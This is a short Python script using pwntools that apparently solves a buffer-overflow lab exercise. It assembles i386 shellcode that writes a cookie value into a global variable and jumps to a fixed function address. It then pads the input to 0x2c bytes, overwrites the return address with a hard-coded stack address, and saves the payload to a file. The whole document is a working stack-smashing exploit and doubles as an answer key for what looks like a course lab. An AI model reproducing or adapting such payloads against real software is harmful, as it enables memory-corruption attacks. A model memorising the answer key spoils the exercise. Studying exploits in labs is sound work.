from pwn import *
context.arch='i386'
code=asm('''
        mov eax,0x2b65becd
        mov DWORD PTR ds:0x804d100,eax
        push 0x08048c9d
        ret
         ''')
code+=b'a'*(0x2c-len(code))
code+=p32(0x556837f8)+b'\x0a'
with open('txt2','wb') as f:
    f.write(code)